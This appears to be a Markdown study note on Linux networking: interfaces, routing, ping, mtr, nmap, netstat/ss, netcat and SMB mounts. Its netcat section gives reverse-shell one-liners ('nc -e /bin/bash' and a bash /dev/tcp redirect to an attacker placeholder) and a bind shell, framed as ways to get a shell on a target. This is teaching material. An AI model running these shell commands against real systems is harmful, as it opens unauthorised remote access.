# Networking Basics
 
Interfaces, IP addressing, connectivity testing, netstat, and netcat.
 
---
 
## Viewing IP addresses and interfaces
 
```bash
ip a
ip addr show
 
# Old-school (if net-tools is installed)
ifconfig
```
 
Key details in the output:
- `scope host` — this address is only reachable by the host itself (like loopback)
- `lo` (loopback) — how the machine communicates with itself; `localhost` / `127.0.0.1` traffic goes here
- Each interface (e.g., `ens33`, `eth0`, `wlan0`) has a MAC address and one or more IPs
### Two ways to list interfaces
 
```bash
ip link
ip a
```
 
---
 
## Configuring interfaces
 
- **Debian** — uses `/etc/network/interfaces` by default
- **Ubuntu** — uses **netplan** (`.yml` files under `/etc/netplan/`)
### Adding a route to a remote network reachable through another host
 
Example: Debian needs to reach `172.16.0.0/24`, which sits behind CentOS at `192.168.244.131`.
 
**On CentOS (the gateway) — enable forwarding:**
```bash
sudo sysctl -w net.ipv4.ip_forward=1
# Permanent
echo "net.ipv4.ip_forward = 1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
 
# Give it the second interface
sudo ip addr add 172.16.0.1/24 dev ens224
sudo ip link set ens224 up
```
 
**On Debian — add the route:**
```bash
sudo ip route add 172.16.0.0/24 via 192.168.244.131
```
 
---
 
## Connectivity testing
 
### ping
 
```bash
ping <host>
ping -c 4 <host>       # send 4 packets and stop
```
 
TTL fingerprinting (default TTL by OS):
- `64` — Linux
- `128` — Windows
- `255` — Network device
### traceroute
 
Shows the network path (each hop) to a target.
```bash
traceroute <host>
```
 
### mtr
 
Ping + traceroute combined, in real time. Great for spotting where packet loss or latency is happening.
```bash
mtr <host>
```
 
### nmap (basic connectivity)
 
```bash
# Is the host up?
nmap -sn <host>
 
# Skip host discovery — assume it's up (useful when ICMP is blocked)
nmap -Pn <host>
```
 
See [Reconnaissance & Enumeration](./reconnaissance-enumeration.md) for the full nmap workflow.
 
### netcat
 
```bash
# Just check if a port is open
nc -zvn <host> 22
 
# Scan a range
nc -zvn <host> 20-100
```
 
`-z` = zero I/O mode (don't send data, just check the port).
 
---
 
## netstat — listening and established connections
 
```bash
# Show listening ports (what's waiting for connections)
sudo netstat -tlnp
 
# Show established connections (who's currently connected)
sudo netstat -tnp
 
# Show both
sudo netstat -tanp
```
 
Flags:
- `-t` — TCP
- `-l` — listening
- `-n` — numeric (don't resolve hostnames)
- `-p` — show process using the port
- `-a` — all sockets
Modern alternative: `ss` (part of iproute2, faster than netstat)
```bash
ss -tlnp
ss -tanp
```
 
---
 
## Netcat (nc)
 
Netcat reads and writes data across network connections — a Swiss Army knife for network tasks.
 
### Basic syntax
 
```bash
# Client mode — connect to a host on a port
nc <HOST> <PORT>
 
# Server mode — listen on a port
nc -lvnp <PORT>
```
 
### Flags
 
| Flag | Meaning |
|---|---|
| `-l` | Listen mode (be a server) |
| `-v` | Verbose (show connection info) |
| `-n` | No DNS lookup (use IPs directly, faster) |
| `-p` | Specify port number |
| `-u` | Use UDP instead of TCP |
| `-w` | Timeout in seconds |
| `-z` | Zero I/O mode (just check if port is open) |
| `-e` | Execute a program on connection (not in all versions — security risk by design) |
 
### Banner grabbing
 
The banner is the text a service sends when you first connect — often reveals software name and version.
 
```bash
# SSH banner
nc -v <host> 22
# Example output: SSH-2.0-OpenSSH_9.2p1 Debian-2
 
# HTTP banner (type this, then press Enter twice)
nc -v <host> 80
GET / HTTP/1.0
 
# SMTP banner
nc -v <host> 25
 
# FTP banner
nc -v <host> 21
```
 
### Port scanning
 
```bash
# Range of ports (quick check)
nc -zvn <host> 20-100
 
# Specific ports
nc -zvn <host> 22 80 443
```
 
### File transfer
 
**On the receiving machine:**
```bash
nc -lvnp 4444 > received_file.txt
```
 
**On the sending machine:**
```bash
nc <receiver_ip> 4444 < file_to_send.txt
```
 
### Reverse shell
 
The target initiates the connection outward, bypassing firewalls that block inbound traffic. This is the standard way to get a shell on a target through a firewall.
 
**On your attacker box (listener):**
```bash
nc -lvnp 4444
```
 
**On the target (execute this via whatever access you have):**
```bash
# If -e is available
nc -e /bin/bash <attacker_ip> 4444
 
# If -e is disabled (most modern nc)
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
```
 
### Bind shell (opposite direction)
 
The target listens and you connect **to** it. Less useful because firewalls typically block inbound.
 
```bash
# On target
nc -lvnp 4444 -e /bin/bash
 
# On attacker
nc <target_ip> 4444
```
 
---
 
## Mounting a Windows share from Linux (SMB/CIFS)
 
CIFS (Common Internet File System) is the Linux implementation of SMB. `cifs-utils` provides the ability to mount Windows shares.
 
### Steps
 
1. **On Windows:** right-click folder → Properties → Sharing tab → Share. Add the user, set read/write, click Share. Note the network path.
2. **Allow SMB through Windows Firewall** and ensure "File and Printer Sharing" is enabled for private networks.
3. **On Linux:** install `cifs-utils`.
4. **Create a mount point:**
```bash
   sudo mkdir /mnt/windows_share
```
5. **Mount:**
```bash
   # Folder share
   sudo mount -t cifs //192.168.170.135/SharedFolder /mnt/windows_share \
       -o credentials=/root/.smb_credentials
 
   # Whole drive (admin share)
   sudo mount -t cifs //192.168.170.135/C$ /mnt/windows_share \
       -o username=your_windows_username,password=your_windows_password
```
 
For persistent mounting, see [fstab in Linux Storage & Boot](./linux-storage-and-boot.md#fstab-persistent-mounts).
